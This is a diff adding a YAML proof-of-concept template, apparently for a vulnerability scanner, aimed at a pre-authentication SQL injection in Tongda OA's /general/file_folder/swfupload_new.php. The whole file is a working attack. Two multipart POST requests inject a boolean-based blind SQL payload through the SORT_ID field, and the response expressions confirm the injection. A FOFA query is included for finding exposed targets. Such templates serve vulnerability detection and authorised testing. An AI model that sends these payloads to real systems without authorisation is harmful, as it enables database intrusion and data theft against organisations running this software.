@@ -1,0 +1,65 @@
+id: poc-yaml-tongda-swfupload-new-sqli
+info:
+  name: 通达OA swfupload_new 前台SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: POST
+  path: /general/file_folder/swfupload_new.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+  data: "------------GFioQpMK0vv2\nContent-Disposition: form-data; name=\"ATTACHMENT_ID\"\
+    \n\n1\n------------GFioQpMK0vv2\nContent-Disposition: form-data; name=\"ATTACHMENT_NAME\"\
+    \n  \n1\n------------GFioQpMK0vv2\nContent-Disposition: form-data; name=\"FILE_SORT\"\
+    \n\n2\n------------GFioQpMK0vv2\nContent-Disposition: form-data; name=\"SORT_ID\"\
+    \n\n0 rlike (select (case when (1=0) then 1 else 0x28 end))\n------------GFioQpMK0vv2--\n"
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"错误，请联系管理员") &&
+
+    !contains(body,"status")
+
+    '
+- method: POST
+  path: /general/file_folder/swfupload_new.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+  data: '------------GFioQpMK0vv2
+
+    Content-Disposition: form-data; name="ATTACHMENT_ID"
+
+
+    1
+
+    ------------GFioQpMK0vv2
+
+    Content-Disposition: form-data; name="ATTACHMENT_NAME"
+
+
+    1
+
+    ------------GFioQpMK0vv2
+
+    Content-Disposition: form-data; name="FILE_SORT"
+
+
+    2
+
+    ------------GFioQpMK0vv2
+
+    Content-Disposition: form-data; name="SORT_ID"
+
+
+    0 rlike (select (case when (1=1) then 1 else 0x28 end))
+
+    ------------GFioQpMK0vv2--
+
+    '
+  expression: "status_code == 200 && \n!contains(gbk_decode(body),\"错误，请联系管理员\") &&\n\
+    contains(find_json(body,\"status\"), \"1\")\n"
+variables: {}
+transport: http
